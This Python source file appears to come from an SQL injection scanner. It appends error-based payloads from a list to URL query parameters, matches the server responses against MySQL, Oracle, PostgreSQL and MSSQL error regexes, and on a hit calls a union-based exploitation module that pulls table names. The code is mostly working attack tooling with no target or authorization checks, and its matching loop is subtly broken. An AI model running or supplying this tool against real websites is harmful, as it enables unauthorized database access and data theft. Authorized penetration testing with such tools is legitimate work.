import requests
from urllib.parse import urlparse
import re
import Union_based_attack
from sys import platform

if platform == "linux" or platform == "linux2":
    with open(r'Error-regexs/MySQL_Error.txt', 'r') as Mysql_Errors:
        Mysql_Error = Mysql_Errors.readlines()
    with open(r'Error-regexs/Oracle_Error.txt', 'r') as Oracle_Errors:
        Oracle_Error = Oracle_Errors.readlines()
    with open(r'Error-regexs/PostgreSQL_Error.txt', 'r') as PostgreSQL_Errors:
        PostgreSQL_Error = PostgreSQL_Errors.readlines()
    with open(r'Error-regexs/MsSQL_Error.txt', 'r') as MS_Errors:
        MS_Error = MS_Errors.readlines()
else:
    with open(r'Error-regexs\MySQL_Error.txt', 'r') as Mysql_Errors:
        Mysql_Error = Mysql_Errors.readlines()
    with open(r'Error-regexs\Oracle_Error.txt', 'r') as Oracle_Errors:
        Oracle_Error = Oracle_Errors.readlines()
    with open(r'Error-regexs\PostgreSQL_Error.txt', 'r') as PostgreSQL_Errors:
        PostgreSQL_Error = PostgreSQL_Errors.readlines()
    with open(r'Error-regexs\MsSQL_Error.txt', 'r') as MS_Errors:
        MS_Error = MS_Errors.readlines()

DB_errors = [Mysql_Error, Oracle_Error, PostgreSQL_Error, MS_Error]


def exploit_sqli(url, payload, param):
    param += payload
    injection_url = urlparse(url).scheme + "://" + urlparse(url).netloc + urlparse(url).path + "?" + param
    response = requests.get(injection_url)
    for i in range(len(DB_errors)):
        for massage in DB_errors[i]:
            massage = massage.strip()
            pattern = re.compile(massage)
            if pattern.search(response.text):
                return True, massage
            else:
                return False


def sample_Get_inj(url):
    outputs_get_inj = []
    tables = []
    outputs_of_union_based_attack = []
    params = urlparse(url).query.split("&")
    print("[*] Test Error based injection")
    outputs_get_inj.append("[*] Test Error based injection")
    for param in params:
        print("[*] Test Parameter: {}".format(param))
        outputs_get_inj.append(f"[*] Test Parameter: {param}")
        with open('Error-regexs/Error-based-payloads.txt', 'r') as payload_list:
            for payload in payload_list:
                payload = payload.strip()
                injected, massage = exploit_sqli(url, payload, param)
                if injected:
                    print("[+] SQL injection is Founded, using payload: {} ".format(payload))
                    outputs_get_inj.append(f"[+] SQL injection is Founded, using payload: {payload}")
                    out, tables, pay, oracle = Union_based_attack.UnionExploitation(url, massage)
                    outputs_get_inj += out
                    break

    return outputs_get_inj, tables, pay, oracle


